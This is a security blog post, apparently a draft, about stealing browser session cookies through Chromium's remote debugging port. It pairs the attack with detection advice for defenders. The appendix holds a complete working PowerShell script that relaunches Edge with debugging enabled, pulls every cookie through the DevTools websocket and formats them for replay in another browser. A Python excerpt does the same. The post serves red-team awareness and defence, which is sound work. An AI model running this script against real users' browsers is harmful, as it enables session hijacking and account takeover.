---
title: "Pivot to the Clouds: Cookie Theft in 2024"
date: 2024-05-16T00:00:11-08:00
draft: true
tags: [
    "threats", "ttp", "cookies", "red"
    ]

twitter:
  card: "summary_large_image"
  site: "@wunderwuzzi23"
  creator: "@wunderwuzzi23"
  title: "Pivoting to the Clouds: Cookie Theft in 2024"
  description: "Cookie Theft using Remote Debugging feature in 2024. --remote-debug-port"
  image: "https://embracethered.com/blog/images/2024/cookie-theft.png"
---

Recently Google published a blog about [detecting browser data theft using Windows Event Logs](https://security.googleblog.com/2024/04/detecting-browser-data-theft-using.html). 

There are some good points in the post for defenders on how to detect misuse of `DPAPI` calls attempting to grab sensitive browser data.

## But, what about the Remote Debugging feature?

This made me curious to revisit the state of the remote debugging feature of browsers for grabbing sensitive information, including cookies. 

We discussed cookie theft techniques [in](https://embracethered.com/blog/posts/2020/firefox-cookie-debug-client/) [the](https://embracethered.com/blog/posts/2020/cookie-crimes-on-mirosoft-edge/) [past](https://embracethered.com/blog/posts/2020/2600-hacker-pass-the-cookie/), even [presented about it at the CCC](https://embracethered.com/blog/posts/passthecookie/) some 5+ years ago and helped add the TTP to the [MITRE ATT&CK matrix](https://attack.mitre.org/techniques/T1539/).

So, how difficult is it in 2024 for malware to grab cookies, specifically using the remote debugging technique?

## tl;dr

The landscape is practically the same as a few years ago. AVs and EDRs, by default, don't seem to help with this cookie theft technique. 

**Defenders have to build custom detection rules, and look for things like processes launching the browser via `--remote-debug-port`, filter out noise, and things along those lines**. 

![cookie thief](/blog/images/2024/cookie-theft.png)


**Let's revisit this technique to raise awareness.**


## Quick Recap - Overview

Here are the basic steps of what happens:

1. Malware runs on user's machine
2. Malware launches a browser with remote debugging enabled (in this case we'll focus on Chromium based ones, [but others have similar features](https://embracethered.com/blog/posts/2020/firefox-cookie-debug-client/)
3. Malware connects to the debugging port
4. Malware invokes the API and attacker downloads all cookies, [or remote control the browser](https://embracethered.com/blog/posts/2020/cookie-crimes-on-mirosoft-edge/)
5. Attacker uses the cookies and gains access to resources

**Note:** This specific technique via the remote debugging port was originally described as ["Cookie Crimes" by @mangopdf](https://github.com/defaultnamehere/cookie_crimes) for Chrome.

### Technical Details

This time around I figured to redo it in PowerShell, and I used ChatGPT to write most of the code. 

You can find the script in the [appendix](#appendix). 

Turns out ChatGPT is pretty good at writing malware. 😊

#### **Malware launches browser**

Here is an example how this can be simulated with `Powershell.exe` and we'll use the `Edge` browser:

```
Get-Process msedge | Stop-Process
Start-Process "msedge.exe" "https://outlook.com --remote-debugging-port=9222 --remote-allow-origins=*"
```

Now the user's browser is relaunched, and the debug port is enabled.

#### **Malware retrieves the debugging websocket details**

Before we can connect to the debugging websocket, we need to know its location. This can be quickly found by downloading the `/json` configuration information:

`curl http://localhost:9222/json` # Note: curl is just an alias for `Invoke-WebRequest`

[![websocket information](/blog/images/2024/cookie-theft-websocket-info.png)](/blog/images/2024/cookie-theft-websocket-info.png)

The output contains a lot of metadata for debugging, including the DevTools web interface endpoint, as well as the websocket details.

#### **Malware connects to debugging port and retrieves cookies**

Connect to the websocket and invoke the `getAllCookies` API, the complete PowerShell script to do so in the [Appendix](#appendix). It's a bit lengthy due to it being PowerShell. :) 

And, that's it. 

Now, the attacker can plug these cookies into their browser and impersonate the target.

#### **Allowing remote origins**

When revisiting this a few days ago, there was one change that had to be done from a couple of years ago.

Initially, I got this error:

```
Error: websocket._exceptions.WebSocketBadStatusException: Handshake status 403 Forbidden 
Rejected an incoming WebSocket connection from the http://localhost:9222 origin. 
Use the command line flag --remote-allow-origins=http://localhost:9222 to allow connections 
from this origin or --remote-allow-origins=* to allow all origins.
```

As you can see the error message already points to a solution for the problem, which is to launch the browser including the `--remote-allow-origins=*` command line argument.


## Recommendations

There is a long list of best practices, and dedicated detections to consider implementing:

- Only use dedicated **Admin Workstations and accounts** to manage critical cloud and SaaS resources
- Gather logs and look for process creation events with `--remote-debug-port` or `--remote-debug-address` and understand which parent process launched it. It could be malware, but might also be legitimate test/development use
- Server-side access anomalies and impossible travel can be good indicators of a compromise
- Don't just look for PowerShell or Python starting the browser process with the debug port
- Adding ETW events for when remote debugging is used, or for when someone calls the API's to read cookies via this attack could be quite useful to help defender (this could be useful addition by vendors, I don't think it exists at the moment afaik)
- **Device Bound Session Credentials**: [DBSC](https://github.com/WICG/dbsc) will hopefully become a solid mitigation so that an adversary who stole cookies, can't use them from another device.

## Conclusion

Token and Cookie Theft are common techniques adversaries use to compromise cloud resources. There are a variety of ways an adversary can gain access to session cookies and **pass the cookie**. 

Remote debugging is an attack technique that requires building custom detection rules across an organization to monitor its usage and catch misuse.

ChatGPT was useful to help implement the technique using PowerShell.

Additionally, keep an eye on the progress of `Device Bound Session Credentials (DBSC)`, which could significantly reduce the risk of stolen cookies across devices.

Cheers.

## Appendix

### PowerShell version

PowerShell Implementation for Cookie Crimes. A lot of this code was created with the help of ChatGPT.

Launching browser with remote debugging on (note this first terminates all instances, so if you want to be less intrusive you can copy the user profile or just wait a bit longer):

```
Get-Process msedge | Stop-Process
Start-Process "msedge.exe" "https://outlook.com --remote-debugging-port=9222 --remote-allow-origins=* --restore-last-session"
```

Connect and invoke the web socket API `Network.getAllCookies`

```
$jsonResponse = Invoke-WebRequest 'http://localhost:9222/json' -UseBasicParsing
$devToolsPages = ConvertFrom-Json $jsonResponse.Content
$ws_url = $devToolsPages[0].webSocketDebuggerUrl

$ws = New-Object System.Net.WebSockets.ClientWebSocket
$uri = New-Object System.Uri($ws_url)
$ws.ConnectAsync($uri, [System.Threading.CancellationToken]::None).Wait()

$GET_ALL_COOKIES_REQUEST = '{"id": 1, "method": "Network.getAllCookies"}'
$buffer = [System.Text.Encoding]::UTF8.GetBytes($GET_ALL_COOKIES_REQUEST)
$segment = New-Object System.ArraySegment[byte] -ArgumentList $buffer, 0, $buffer.Length
$ws.SendAsync($segment, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, [System.Threading.CancellationToken]::None).Wait()

$completeMessage = New-Object System.Text.StringBuilder
do {
    $receivedBuffer = New-Object byte[] 2048
    $receivedSegment = New-Object System.ArraySegment[byte] -ArgumentList $receivedBuffer, 0, $receivedBuffer.Length
    $result = $ws.ReceiveAsync($receivedSegment, [System.Threading.CancellationToken]::None).Result
    $receivedString = [System.Text.Encoding]::UTF8.GetString($receivedSegment.Array, $receivedSegment.Offset, $result.Count)
    $completeMessage.Append($receivedString)
} while (-not $result.EndOfMessage)

$ws.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure, "Closing", [System.Threading.CancellationToken]::None).Wait()

try {
    $response = ConvertFrom-Json $completeMessage.ToString()
    $cookies = $response.result.cookies
    # $cookies
} catch {
    Write-Host "Error parsing JSON data."
}

$cookieName = "*"  
$specificCookies = $cookies | Where-Object { $_.name -like $cookieName }

$cookieCommands = @()  
foreach ($cookie in $specificCookies) {
    $escapedValue = $cookie.value -replace "'", "\'"
    $escapedPath = $cookie.path -replace "'", "\'"
    $escapedDomain = $cookie.domain -replace "'", "\'"

    $cookieCommand = "document.cookie='" + $cookie.name + "=" + $escapedValue +
                     "; Path=" + $escapedPath + "; Domain=" + $escapedDomain + ";secure';"
    $cookieCommands += $cookieCommand
}

# Join all commands into one long string to be executed in a browser console
$allCookieCommands = $cookieCommands -join " "
Write-Host $allCookieCommands
Set-Clipboard -Value $allCookieCommands
```

### Python version (Cookie Crimes)

Here are the key lines of [Python code](https://github.com/defaultnamehere/cookie_crimes/blob/master/cookie_crimes.py) to grab the cookies:

```
ws_url="ws://localhost:9222/devtools/page/GRAB_FROM_JSON_ENDPOINT"
ws = websocket.create_connection(ws_url)
GET_ALL_COOKIES_REQUEST = json.dumps({"id": 1, "method": "Network.getAllCookies"})
ws.send(GET_ALL_COOKIES_REQUEST)
result = ws.recv()
ws.close()
response = json.loads(result)
cookies = response["result"]["cookies”]
```


## References

* [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539/)
* [Use Alternate Authentication Material: Web Session Cookie](https://attack.mitre.org/techniques/T1550/004/)
* [Cookie Crimes](https://github.com/defaultnamehere/cookie_crimes)
* [Detecting browser data theft using Windows Event Logs](https://security.googleblog.com/2024/04/detecting-browser-data-theft-using.html)
